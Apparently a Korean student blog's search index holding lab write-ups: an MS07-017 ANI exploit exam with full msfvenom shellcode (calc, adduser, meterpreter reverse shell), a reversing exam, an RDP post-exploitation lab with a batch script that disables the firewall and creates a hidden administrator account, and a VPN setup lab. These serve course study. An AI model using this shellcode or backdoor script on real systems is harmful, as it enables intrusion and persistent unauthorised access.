[ { "title": "시스템 보안실무 기말고사", "url": "/posts/%EC%8B%9C%EC%8A%A4%ED%85%9C%EB%B3%B4%EC%95%88%EC%8B%A4%EB%AC%B4-%EA%B8%B0%EB%A7%90%EA%B3%A0%EC%82%AC/", "categories": "Blogging, Network", "tags": "getting started", "date": "2022-12-15 20:00:00 +0800", "snippet": "Q1해당 취약점과 관련된 애니메이션 (.ANI) 파일의 구조를 이해하고 있는가? (DRUM.ANI 파일을 예시로 질문함)ANI 파일은 멀티미디어 파일 포맷인 RIFF 포맷을 기반으로 구성되기 때문에 “RIFF” 시그니처를 포함한 헤더로 시작한다.RIFF는 “청크(Chunk)”라 부르는 가변 길이의 구획으로 구성되어 있기 때문에 ANI 파일은 청크 자료구조를 다수 포함한다.청크의 자료구조 멤버 사이즈 유형 tag, 청크 유형 표시 4byte seq, LIST, rate, anih size, 청크 사이즈 4byte   data, 청크 데이터 data[size]   52 49 46 46 a0 0c 00 00 41 43 4f 4e 4c 49 53 54 |RIFF....ACONLIST| 첫 번째 청크 자료구조 시작(LIST 유형, 사이즈 0X44)44 00 00 00 49 4e 46 4f 49 4e 41 4d 0a 00 00 00 |D...INFOINAM....|44 72 75 6d 20 52 6f 6c 6c 00 49 41 52 54 26 00 |Drum Roll.IART&amp;amp;.|00 00 4d 69 63 72 6f 73 6f 66 74 20 43 6f 72 70 |..Microsoft Corp|6f 72 61 74 69 6f 6e 2c 20 43 6f 70 79 72 69 67 |oration, Copyrig|68 74 20 31 39 39 33 00 61 6e 69 68 24 00 00 00 |ht 1993.anih$...| 두 번째 청크 자료구조의 시작(anih 유형, 사이즈 0x24)24 00 00 00 04 00 00 00 04 00 00 00 00 00 00 00 |$...............|00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 |................|01 00 00 00 4c 49 53 54 1c 0c 00 00 66 72 61 6d |....LIST....fram| 세 번째 청크 자료구조의 시작(LIST 유형, 사이즈 0xC1C)Q2취약한 함수의 스택 프레임에 있는 SFP, 지역변수 영역과 범위, 리턴 주소를 코드분석(IDA) 혹은 디버킹을 통해 식별할 수 있는가?취약한 함수와 주소취약함 함수 : LoadAniIcon취약한 함수의 주소 : 0x77D83F83IDA를 통해 취약한 함수인 LoadAniIcon 함수와 주소를 확인할 수 있다.스택 프레임에 있는 SFP스택 프레임의 SFP 주소 0x0013DF140x77D83F88에 Break Point를 걸고나서 RET과 SFP를 확인할 수 있다.지역변수 영역과 범위SUB ESP, 4C 를 통해 지역변수를 76Byte 만큼 확보한것을 알 수 있다.SUB : 빼는 의미도 있지만, 뒤에 나오는 영역만큼 확보 (할당) 한다는 뜻도 있음.ESP : 수시로 값이 변하는 애라 변수, 파라미터 등에 접근할 수 있다. 4C : hex로 4C는 76이라는 값이 나오게 됨.리턴 주소IDA를 통해 LoadAniIcon의 리턴 주소를 파악할 수 있다.Q3트램펄린 공격의 간접분기에 사용할 “JMP XXX” 코드를 MONA 플로그인을 이용해 찾고, 익스플로잇 제작에 적용할 수 있는가? (CALL EDI 제외)1. Mona 플로그인 사용디버거로 IExplore 를 Attach 후 해당 명령어 사용!mona findwild -s JMP EDI나온 결과에서 주소 아무거나 선택 JMP ~~~ 는 반드시 포함되어야 함2. 코드 수정04.ms07017_exploit_adduser.py 코드 부분 수정...padding2ret = &quot;\\x00&quot; * 80 ret = &quot;\\x74\\x0c\\x71\\x7d&quot; #선택 했던 주소를 리틀 엔디안으로 변경padding2edi = &quot;\\x00&quot; * 20 ...3. 결과 확인python2 04.ms07017_exploit_adduser.pyhexdump -C exploit.aniQ4익스플로잇 코드의 페이로드를 자유롭게 바꾸어 공격환경을 구현할 수 있는가?Q3에서 선택하였던 주소를 이어서 사용 (ret 부분 변경 필요)05.ms07017_exploit_fixpayload.py를 사용0. 코드 설명pack(&quot;&amp;lt;l&quot;, len(shellcode + padding2ret + ret + padding2edi))쉘코드 길이, 패딩 길이, retn 길이, 두번째 패딩의 길이라는 걸 알아둬앞에 있는 len함수가 알아서 계산해주고 청크 사이즈에 포함이 되기 때문에파이썬 쉘코드를 마음껏 조작해도 사이즈 관련해서 문제될 것이 없음!shellcode_bytearrarydata = bytearray(shellcode)bytearray 함수를 이용하여 shellcode를 shellcode_bytearrarydata라는 배열에 넣음shellcode_bytearrarydata에는 값이 하나씩 들어가기 시작. fc, e8, 82 … ~ 배열에 왜 써야하냐!시작부터 184바이트 만큼 offset에 위치하는 데이터 값을 변경하고 add해줘야 정상적으로 들어가기 때문! pack_into (&quot;&amp;lt;h&quot;, shellcode_bytearraydata, 184, unpack_from(&quot;&amp;lt;h&quot;, shellcode_bytearraydata, 184)[0] - len(shellcode + padding2ret + ret + padding2edi)) &amp;lt;h : 리틀엔디안 기준으로 2바이트를 가져와줘. 일종의 포맷스트링 shellcode_bytearraydat에 184번째 위치에 있는 데이터를 가져오는 것. 184 : offset이게 하나의 문법으로 unpack_from을 통해 데이터가 추출된다.pack_into 구문을 통해 재주입이 될 예정.len(shellcode + padding2ret + ret + padding2edi)&amp;lt;br&amp;gt;쉘코드 길이, 패딩 길이, retn 길이, 두번째 패딩의 길이 값을 미리 빼준다. 헤더에 존재하는 pack ~~ 코드와 같은 역할을 함. 뭔 일이 일어나냐! shellcode_bytearrarydata 배열에 값이 하나씩 들어가있는데, 그 데이터들 중에서 184바이트 옵셋에 있는 2바이트 데이터를 추출하게 된다. ex) 예시 예를 들어 배열에서 2바이트 추출된 데이터가 12 34이다. 리틀엔디안을 통해 3412 라는 데이터로 나오게 되는데, 이 값에 미리 (쉘코드 길이, 패딩 길이, retn 길이, 두번째 패딩)을 합한 사이즈만큼 빼주는 것. 메모리 상에서 사이즈 값만큼 더해져서 빼주고, 빼둔 3412라는 값을 1234가 있던 자리에 재주입. 요약 : pack_into ~ 자체가 배열에서 184바이트 옵셋에 위치하는 데이터 값을 청크 사이즈만큼 sub하고 재주입해줘서 공격이 실패할 경우를 방지하는 애다.1. 계산기 띄우기해당 스크립트 실행msfvenom --payload windows/exec --platform windows --format python --smallest CMD=calc.exe나온 쉘코드를 05.ms07017_exploit_fixpayload.py에 수정shellcode = b&quot;&quot;shellcode += b&quot;\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b&quot;shellcode += b&quot;\\x50\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7&quot;shellcode += b&quot;\\x4a\\x26\\x31\\xff\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf&quot;shellcode += b&quot;\\x0d\\x01\\xc7\\xe2\\xf2\\x52\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c&quot;shellcode += b&quot;\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1\\x51\\x8b\\x59\\x20\\x01&quot;shellcode += b&quot;\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31&quot;shellcode += b&quot;\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03\\x7d&quot;shellcode += b&quot;\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66&quot;shellcode += b&quot;\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0&quot;shellcode += b&quot;\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f&quot;shellcode += b&quot;\\x5f\\x5a\\x8b\\x12\\xeb\\x8d\\x5d\\x6a\\x01\\x8d\\x85\\xb2\\x00&quot;shellcode += b&quot;\\x00\\x00\\x50\\x68\\x31\\x8b\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5&quot;shellcode += b&quot;\\xa2\\x56\\x68\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x3c\\x06\\x7c\\x0a&quot;shellcode += b&quot;\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x53&quot;shellcode += b&quot;\\xff\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00&quot;XP에서 결과 확인2. 관리자로 계정 생성해당 스크립트 실행msfvenom --payload windows/adduser --platform windows --format python USER=maluser PASS=P@SSw0rd1!나온 쉘코드를 05.ms07017_exploit_fixpayload.py에 수정shellcode = b&quot;&quot;shellcode += b&quot;\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b&quot;shellcode += b&quot;\\x50\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7&quot;shellcode += b&quot;\\x4a\\x26\\x31\\xff\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf&quot;shellcode += b&quot;\\x0d\\x01\\xc7\\xe2\\xf2\\x52\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c&quot;shellcode += b&quot;\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1\\x51\\x8b\\x59\\x20\\x01&quot;shellcode += b&quot;\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31&quot;shellcode += b&quot;\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03\\x7d&quot;shellcode += b&quot;\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66&quot;shellcode += b&quot;\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0&quot;shellcode += b&quot;\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f&quot;shellcode += b&quot;\\x5f\\x5a\\x8b\\x12\\xeb\\x8d\\x5d\\x6a\\x01\\x8d\\x85\\xb2\\x00&quot;shellcode += b&quot;\\x00\\x00\\x50\\x68\\x31\\x8b\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5&quot;shellcode += b&quot;\\xa2\\x56\\x68\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x3c\\x06\\x7c\\x0a&quot;shellcode += b&quot;\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x53&quot;shellcode += b&quot;\\xff\\xd5\\x63\\x6d\\x64\\x2e\\x65\\x78\\x65\\x20\\x2f\\x63\\x20&quot;shellcode += b&quot;\\x6e\\x65\\x74\\x20\\x75\\x73\\x65\\x72\\x20\\x6d\\x61\\x6c\\x75&quot;shellcode += b&quot;\\x73\\x65\\x72\\x20\\x50\\x40\\x53\\x53\\x77\\x30\\x72\\x64\\x31&quot;shellcode += b&quot;\\x21\\x20\\x2f\\x41\\x44\\x44\\x20\\x26\\x26\\x20\\x6e\\x65\\x74&quot;shellcode += b&quot;\\x20\\x6c\\x6f\\x63\\x61\\x6c\\x67\\x72\\x6f\\x75\\x70\\x20\\x41&quot;shellcode += b&quot;\\x64\\x6d\\x69\\x6e\\x69\\x73\\x74\\x72\\x61\\x74\\x6f\\x72\\x73&quot;shellcode += b&quot;\\x20\\x6d\\x61\\x6c\\x75\\x73\\x65\\x72\\x20\\x2f\\x41\\x44\\x44&quot;shellcode += b&quot;\\x00&quot;결과 확인3. 핸들러 이용해당 스크립트 실행msfvenom --payload windows/meterpreter/reverse_tcp --platform=windows --format python [LHOST=공격자 IP] LPORT=443나온 쉘코드를 05.ms07017_exploit_fixpayload.py에 수정이건 IP마다 다르니 각자 실행해서 사용!!shellcode = b&quot;&quot;shellcode += b&quot;\\xfc\\xe8\\x8f\\x00\\x00\\x00\\x60\\x31\\xd2\\x89\\xe5\\x64\\x8b&quot;shellcode += b&quot;\\x52\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x31\\xff\\x8b\\x72\\x28&quot;shellcode += b&quot;\\x0f\\xb7\\x4a\\x26\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20&quot;shellcode += b&quot;\\xc1\\xcf\\x0d\\x01\\xc7\\x49\\x75\\xef\\x52\\x57\\x8b\\x52\\x10&quot;shellcode += b&quot;\\x8b\\x42\\x3c\\x01\\xd0\\x8b\\x40\\x78\\x85\\xc0\\x74\\x4c\\x01&quot;shellcode += b&quot;\\xd0\\x8b\\x58\\x20\\x50\\x01\\xd3\\x8b\\x48\\x18\\x85\\xc9\\x74&quot;shellcode += b&quot;\\x3c\\x49\\x31\\xff\\x8b\\x34\\x8b\\x01\\xd6\\x31\\xc0\\xc1\\xcf&quot;shellcode += b&quot;\\x0d\\xac\\x01\\xc7\\x38\\xe0\\x75\\xf4\\x03\\x7d\\xf8\\x3b\\x7d&quot;shellcode += b&quot;\\x24\\x75\\xe0\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\\x0c\\x4b&quot;shellcode += b&quot;\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24&quot;shellcode += b&quot;\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x58\\x5f\\x5a\\x8b&quot;shellcode += b&quot;\\x12\\xe9\\x80\\xff\\xff\\xff\\x5d\\x68\\x33\\x32\\x00\\x00\\x68&quot;shellcode += b&quot;\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\\x07\\x89\\xe8\\xff&quot;shellcode += b&quot;\\xd0\\xb8\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\\x29\\x80&quot;shellcode += b&quot;\\x6b\\x00\\xff\\xd5\\x6a\\x0a\\x68\\xc0\\xa8\\x0b\\x82\\x68\\x02&quot;shellcode += b&quot;\\x00\\x01\\xbb\\x89\\xe6\\x50\\x50\\x50\\x50\\x40\\x50\\x40\\x50&quot;shellcode += b&quot;\\x68\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x97\\x6a\\x10\\x56\\x57\\x68&quot;shellcode += b&quot;\\x99\\xa5\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0a\\xff\\x4e\\x08&quot;shellcode += b&quot;\\x75\\xec\\xe8\\x67\\x00\\x00\\x00\\x6a\\x00\\x6a\\x04\\x56\\x57&quot;shellcode += b&quot;\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7e\\x36\\x8b&quot;shellcode += b&quot;\\x36\\x6a\\x40\\x68\\x00\\x10\\x00\\x00\\x56\\x6a\\x00\\x68\\x58&quot;shellcode += b&quot;\\xa4\\x53\\xe5\\xff\\xd5\\x93\\x53\\x6a\\x00\\x56\\x53\\x57\\x68&quot;shellcode += b&quot;\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7d\\x28\\x58\\x68&quot;shellcode += b&quot;\\x00\\x40\\x00\\x00\\x6a\\x00\\x50\\x68\\x0b\\x2f\\x0f\\x30\\xff&quot;shellcode += b&quot;\\xd5\\x57\\x68\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x5e\\x5e\\xff\\x0c&quot;shellcode += b&quot;\\x24\\x0f\\x85\\x70\\xff\\xff\\xff\\xe9\\x9b\\xff\\xff\\xff\\x01&quot;shellcode += b&quot;\\xc3\\x29\\xc6\\x75\\xc1\\xc3\\xbb\\xf0\\xb5\\xa2\\x56\\x6a\\x00&quot;shellcode += b&quot;\\x53\\xff\\xd5&quot;칼리에서 handler_meterpreter_reverse_443.rc를 실행윈도우에서 접속 후 세션이 잘 받아졌는지 확인Q5익스플로잇을 디자인 하는 과정에서 리턴 주소까지의 이격(Offset)을 사이클릭 패턴을 이용하여 계산해 낼 수 있는가?02.fuzzing_payload_cyclic.py을 이용하여 사이클릭 패턴으로 Access Violation를 일으켜 리턴 어드레스 까지의 길이 확인EIP를 확인 후 msf-pattern_offset -l [갯수] -q [EIP값]ex) msf-pattern_offset -l 150 -q 37634136Q6익스플로잇을 디자인 하는 과정에서 트램펄린 공격에 사용할 레지스터를 찾고 레지스터가 가리키는 곳 까지의 이격을 계산해 낼 수 있는가?설명Q5에서 진행하였던 RET 전까지의 이격 : 80 Q6에서 진행한 레지스터 까지의 이격 : 104RET 포함 84Byte - 104Byte = 20Nyte 20만큼의 패딩 공간이 남는다.실습02.fuzzing_payload_cyclic.py을 이용하여 사이클릭 패턴으로 Access Violation를 일으켜 분기가 가능한 레지스터 찾기ESP와 EDI를 확인하게 되면 4Ad5의 패턴을 알 수 있음EIP를 확인 후 msf-pattern_offset -l [갯수] -q [EIP값]ex) msf-pattern_offset -l 150 -q 4Ad5" }, { "title": "시스템 보안실무 중간고사", "url": "/posts/%EC%8B%9C%EC%8A%A4%ED%85%9C%EB%B3%B4%EC%95%88%EC%8B%A4%EB%AC%B4-%EC%A4%91%EA%B0%84%EA%B3%A0%EC%82%AC/", "categories": "Blogging, Network", "tags": "getting started", "date": "2022-10-20 20:00:00 +0800", "snippet": "실행파일 및 코드 분석 영역 (Stud_PE, IDA)Q1. 해당 실행 파일이 매핑될 메모리상의 가상주소(Imagebase)는 무엇입니까?Stude_PE에서 ImageBase를 확인할 수 있다. 답 : 0x00400000Q2. 해당 실행 파일이 메모리에 로드된 후 가장먼저 실행되는 코드의 주소(Address of Entrypoint)는 무엇입니까?(옵셋 값 말고 메모리 상의 가상주소 값을 적어 주세요) 답 : 0x004012A7ImageBase (0x00400000) + Address of EntryPoint Offset(0x000012A7)Q3. 함수 “Func_A”가 호출되는 지점의 가상주소는 무엇입니까?답 : 0x0040106CIDA에서 Main 함수를 찾은 후 Func_A가 호출되는 지점의 가상주소를 알 수 있다.Func_A를 더블클릭하여, Func_A함수의 시작 지점을 보면 0x00401010 인것을 알 수 있다.Q4. 함수 “MAIN” 에서 할당하는 지역변수 공간의 크기는 몇 바이트 입니까?답 : 8바이트어셈블리어 특성상 변수들의 공간을 할당한 뒤 적재한다.SUB ESP, 8로 인해서 8바이트 만큼의 공간을 할당한다고 볼 수 있다.Q5. 함수 “MAIN”의 지역변수 공간을 사용하는 변수가 정수(Integer, 사이즈 4바이트)일 경우 몇 개의 지역변수가 할당 되었다고 추정되나요? 그리고 그 이유는 무엇입니까?답 : 2개의 지역변수DWORD 자료형을 보면 4바이트씩 할당된것을 볼 수 있다. [EBP + 8]에는 4라는 숫자와 [EBP + 4]에는 3이라는 숫자가 각각 하나씩 들어갔기 때문에 2개라고 추정할 수 있다.Q6. 함수 “Func_A” 가 종료된 이후 실행되는 코드의 주소(리턴 주소)는 무엇입니까?답 : 0x00401071함수 Func_A 진입 후 스택 프레임에는 0x00401071이 들어가져 있는것을 볼 수 있다.0x00401071의 값은 Func_A의 다음 실행 줄 정보를 담고 있다. Func_A 함수가 종료될 시 스택메모리에서 POP EIP와 유사한 기능을 하는 RETN으로 인해 EIP레지스터가 0x00401071로 수행된다. 디버깅 영역 (Immunity Debugger, xDbg)Q7. 디버를 이용하여 함수 “MAIN”의 “0x00401053 SUB ESP, 8” 코드까지 실행해 주세요.해당 코드까지 실행된 상태를 증명해 주세요.PUSH EBPMOV ESP, EBP위 코드는 프롤로그로 함수가 시작할 때 하는 행위이다. PUSH EBP를 해주면 MAIN을 가르키던 MAIN EBP를 RETN위로 쌓아주고 MOV EBP를 해주면 그 위에 새로운 EBP가 생기면서 새로운 스택 프레임이 생긴다 +----------------+| RET |+----------------+| SFP |+----------------+SUB ESP, 8을 통해8바이트의 공간이 할당된다.변수 A와 B를 위한 공간이다.+----------------+| RET |+----------------+| SFP |+----------------+| B(4Byte) |+----------------+| A(4Byte) |+----------------+ 이 때 EBP 레지스터는 Func_A 함수의 SFP(Saved Frame Pointer)를 가리킵니다. 1)EBP 레지스터의 값 -&amp;gt; 0x0018FF40 2)EBP 레지스터가 가리키는 SFP 값은 무엇입니까? -&amp;gt; 둘중에 하나가 정답.. 0x0018FF40(왼쪽 값), 0x0018FF88(오른쪽 값) Q8. 디버를 이용하여 함수 “Func_A”의 “0x00401041 POP EBP” 코드까지 실행해 주세요.해당 코드까지 실행된 상태를 증명해 주세요. 이제 해당 함수는 “RETN” 코드를 실행하기 직전 상태이며 종료되기 전입니다. 현재 스택의 최상단에 있는 값은 “어떤의미”를 가집니까? 답 : POP EBP를 마친 시점에서의 스택의 최상단은 함수가 끝나고 돌아갈 위치(0x00401071)가 담겨있다.코드를 보게 되면, 연산 레지스터인 EAX 레지스터를 통해, 스택에 저장된 메모리를 통해 연산을 진행하는것을 볼 수 있다.이때 [EBP + 8]과 [EBP + C]를 볼 수 있는데, 이는 MAIN함수에서 넘어온 값으로 추정할 수 있다. Q9. 디버거를 이용하여 함수 “Func_B”의 “0x00401001 MOV EBP, ESP” 코드까지 실행해 주세요.해당 코드까지 실행된 상태를 증명해 주세요.해당 함수의 Stack Frame이 빌드된 상태입니다.이제 “PUSH ECX” 코드가 실행되기 직전입니다. 현재 ESP 레지스터와 EBP 레지스터는 동일한 값을 가지고 있을 것입니다. 두 레지스터는 현재 SFP를 포인팅 하고 있습니다. SFP 값(EBP 혹은 ESP 레지스터)은 무엇입니까? 0x0018FF14??? 0x0018FF28????Q10. 디버거를 이용하여 함수 “Func_A”의 “0x00401037 [EBP+var_C], EAX” 코드까지 실행해 주세요.해당 코드까지 실행된 상태를 증명해 주세요.이제 함수 “Func_B”가 호출되기 직전 상태일 것입니다. “[EBP+var_C]”는 해당 함수의 지역변수 영역입니다. 스택을 확인하여 어떠한 값이 기록되는지 증명하세요.[EBP-C]의 값은 0x12가 들어간다.처음 [EBP-C]는 0이지만, Func_A에서 선언한 5와 6, Main에서 선언한 3, 4를 더하여 0x12가 된다.보너스 문제아래의 변수는 다음과 같은 명칭으로 정의한다. [EBP+8] : A(Main 함수의 지역 변수) [EBP+C] : B(Main 함수의 지역 변수) [EBP-4] : C[EBP-8] : D[EBP-C] : RES EAX 레지스터는 연산에 주로 사용하는 레지스터로 활용된다.그러면 다음과같이 매칭을 할 수 있다.RES = 0C = 5D = 6RES = A + B + C + D 즉, A, B, C, D 전부를 더하는 코드로 해석할 수 있다.아래의 변수는 다음과 같이 정의한다.[EBP-4] : E 그러면 다음과같이 매칭을 할 수 있다.E = 0Func_B의 함수는 변수선언만 한 뒤 종료하는것을 알 수 있다.이로써, Func_A의 함수는 Main함수에서 매개변수로 A와 B를 받아온 후 전부 더하는 함수인것을 알 수 있다." }, { "title": "RDP서비스 활성화 및 원격 통제", "url": "/posts/RDP%EC%84%9C%EB%B9%84%EC%8A%A4-%ED%99%9C%EC%84%B1%ED%99%94-%EB%B0%8F-%EC%9B%90%EA%B2%A9-%ED%86%B5%EC%A0%9C/", "categories": "Blogging, Network", "tags": "getting started", "date": "2022-06-18 20:00:00 +0800", "snippet": "Step1. 환경 구성환경 구성환경 구성은 전과 같다.ip가 56번(내부) 대역에서 57번(외부) 대역으로 서비스에 접근할 수 있지만, 57번(외부) 대역에서 56번(내부) 대역으로는 서비스 접속이 안되게 설정한다.56번, 57번 대역에서는 58번 대역으로 핑이 안 가도록 설정한다.Step2. 사용자 정보 검색윈도우에서 사용자 정보 검색을 위한 명령어는 net user가 있다.rdp_enable.bat 을 보면 사용자 추가, 그룹에 추가하는 명령어가 있으니 참고하면 된다.로컬 그룹 확인로컬 그룹 확인은 net localgroup을 이용하여 확인할 수 있다.C:\\&amp;gt; net localgroup특정 로컬 그룹 확인특정 로컬 그룹 확인은 net localgroup [그룹명] 으로 확인할 수 있다.다음은 관리자 권한을 가지고 있는 로컬 그룹을 확인하는 명령어 이다.C:\\&amp;gt; net localgroup administrators계정 추가계정 추가는 net user [계정명] /add로 추가할 수 있다.기본으로 추가할 시 user그룹에 들어가게 된다.C:\\&amp;gt; net user hacker /add계정 삭제계정 삭제는 net user [계정명] /delete로 삭제할 수 있다.C:\\&amp;gt; net user hacker /delete계정에 비밀번호 추가계정을 만들때 비밀번호를 추가하고 싶다면 net user [계정명] [비밀번호] /add 를 통해 추가할 수 있다.C:\\&amp;gt; net user hacker P@ssw0rd /add계정을 그룹에 추가만든 계정을 그룹에 추가하기 위해서는 net localgroup “[그룹명]” /add [계정명] 으로 그룹에 추가할 수 있다.C:\\&amp;gt; net localgroup &quot;administrators&quot; /add anyuserStep3. 세션 획득칼리에서 handler를 이용하여 세션을 획득한다.windows #1, windows #2 어느 세션으로 해도 상관은 없다.우선 windows #1 기준으로 한다.시작하기 전에 windows #1의 스냅샷을 찍고 시작한다.Step4. RDP 공격RDP 스크립트 준비RDP를 사용하기 위해서는 사용자가 Remote Desktop Users 그룹에 있어야 한다.이를 위한 작업은 rdp_enable.bat이 실행을 하는 것 이다.칼리에서 윈도우 세션을 얻은 상태에서 plink를 활성화 해줄 것 이다.이를 위해서는 rdp_enable.bat파일이 필요하다. rdp_enable.bat@echo offREM ****************REM Disable off &quot;AUTO UPDATE&quot;REM ****************sc config wuauserv start= disablednet stop wuauservREM ****************REM Disable windows xp FirewallREM ****************netsh firewall set opmode disableREM ****************REM Enable TELNETREM ****************sc config tlntsvr start= autonet start telnetREM ****************REM Enable Remote DesktopREM ****************reg add &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /fREM ***************REM Create a HIDDEN USER usr= hack007, pass= daniREM ***************net user hacker007 dani /addnet localgroup &quot;Administrators&quot; /add hacker007net localgroup &quot;Users&quot; /del hacker007reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList&quot; /v hacker007 /t REG_DWORD /d 0 /freg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v dontdisplaylastusername /t REG_DWORD /d 1 /frdp_enable.bat 파일을 칼리로 옮겨준다.그런 후 윈도우로 파일을 업로드 시켜주도록 한다.. 칼리(meterpreter)에서 진행한다.meterpreter&amp;gt; upload /root/Desktop/rdp_enable.bat c:\\\\windows\\\\tempRDP 스크립트 실행윈도우의 쉘을 얻고 rdp_enable.bat 을 실행시킨다. 칼리(shell)에서 진행한다.C:\\WINDOWS\\Temp&amp;gt; rdp_enable.bat정상적으로 실행이 되었다면, netstat -an으로 결과를 확인하여 3389포트가 활성화 되었는지 확인한다. 칼리(shell)에서 진행한다.C:\\WINDOWS\\Temp&amp;gt; netstat -anplink (3389포트)다음으로 plink를 통해 3389번으로 터널링을 진행해준다.만약 네트워크 오류가 났다면 칼리에서 service ssh start를 통해 ssh 서비스를 실행시켜준다. 칼리(shell)에서 진행한다.C:\\WINDOWS\\Temp&amp;gt; plink -R 3389:192.168.56.10:3389 -l root -pw lab 192.168.57.10실행 후 칼리에서 포트가 열려있는지 확인한다.lsof -i:3389 또는 netstat -atunp | grep 3389 으로 확인한다.RDP 실행칼리에서 rdesktop을 통해 원격 제어를 시도하여 본다.kali# rdesktop -u hacker007 -p dani localhost잘 실행 되었다면, 윈도우의 원격 모니터가 뜰 것이다." }, { "title": "VPN과 터널링 프로토콜", "url": "/posts/VPN%EA%B3%BC-%ED%84%B0%EB%84%90%EB%A7%81-%ED%94%84%EB%A1%9C%ED%86%A0%EC%BD%9C/", "categories": "Blogging, Network", "tags": "getting started", "date": "2022-06-17 20:00:00 +0800", "snippet": "Step1. 환경 구성환경 구성환경 구성은 다음과 같다.ip가 56번(내부) 대역에서 57번(외부) 대역으로 서비스에 접근할 수 있지만, 57번(외부) 대역에서 56번(내부) 대역으로는 서비스 접속이 안되게 설정한다.56번, 57번 대역에서는 58번 대역으로 핑이 안 가도록 설정한다.바로 사용하지는 않고, VPN에서 사용을 할 것이다.네트워크 카드 추가우선 충돌이 발생하지 않도록, CentOS, pfsense를 종료하고 스냅샷을 찍어둔 후 진행한다.위의 환경을 만들기 위해서는 네트워크 카드를 만들어야 한다.호스트 네트워크 관리자(Ctrl + H)에 들어가도록 한다. 네트워크 카드를 만들고, 새로 생긴 Adapter #3 를 192.168.58.2 대역으로 설정한다.Step2. 장치 설정pfsense 설정pfsense에서 어댑터3을 추가하여 Adpater #3 으로 설정한다.pfsense를 부팅시킨 후칼리로 pfsense의 방화벽으로 진입한다. (192.168.57.2)로 진입한다.interfaces -&amp;gt; (assign) 을 클릭한다.오른쪽 하단의 add interface를 누른다.그럼 아래와 같이 뜰 것이다.새로 생긴 인터페이스 이름을 클릭하고 Enable Interface를 누른다.다음과 같이 해당 영역을 수정한다.Description의 경우 원하는 이름으로 설정한다.VPN 탭에서 PPTP를 누른다.다음과 같이 해당 영역을 수정한다.Users탭으로 가서 Edit을 누른다.Password는 lab으로 한 후, IP address는 58.10 으로 설정한다.이로써 VPN을 위한 방화벽 설정은 끝났다.CentOS 설정CentOS 설정에서 네트워크 Adapter를 #3로 바꿔준다.CentOS 부팅 후 다음과 같이 설정한다.route add default gw는 설정하지 않는다. (설정해도 ping이 안 가긴 한다. 이유는 모르겠음)Centos# ifconfig eth1 192.168.58.80/24핑을 해본 후 arp -a 로 pfsense가 뜨는지 확인한다.Centos# ping 192.168.58.2Centos# arp -a윈도우 설정Windows #1, #2 상관없다.[윈도우 로고 + R] -&amp;gt; ncpa.cpl 로 들어가 준다.Create a new connection을 누른 후 다음과 같이 진행한다.User name은 방화벽에서 설정한 vpnuserPassword는 lab으로 한다.ncpa.cpl로 네트워크를 살펴보면 MJC이름으로 설정된 VPN이 작동중임을 볼 수 있다.윈도우에서 ipconfig로 살펴보면 58.10으로 VPN이 설정된 것을 볼 수 있다.그 뒤로의 작업은 교수님도 오류남.." }, { "title": "표적 네트워크의 다른 